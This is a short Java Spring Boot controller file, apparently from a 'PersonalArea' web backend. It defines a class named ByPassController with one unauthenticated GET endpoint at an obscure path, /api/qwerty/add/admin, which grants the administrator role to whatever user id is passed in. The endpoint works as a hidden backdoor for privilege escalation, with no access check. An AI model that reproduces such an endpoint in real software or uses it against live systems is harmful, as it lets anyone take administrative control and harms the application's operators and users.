package PersonalArea.backend.controller;

import PersonalArea.backend.models.ERole;
import PersonalArea.backend.models.Role;
import PersonalArea.backend.models.User;
import PersonalArea.backend.repository.RoleRepository;
import PersonalArea.backend.repository.UserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.Set;

@RestController
@RequestMapping("/api/qwerty")
public class ByPassController {

  @Autowired
  RoleRepository roleRepository;

  @Autowired
  UserRepository userRepository;

  @GetMapping("add/admin")
  public String addRoleToUser(@RequestParam Long id) {
    User user = userRepository.getOne(id);
    Set<Role> roles = user.getRoles();
    roles.add(new Role(3, ERole.ROLE_ADMIN));
    user.setRoles(roles);
    userRepository.save(user);
    return user.getRoles().toString();
  }
}
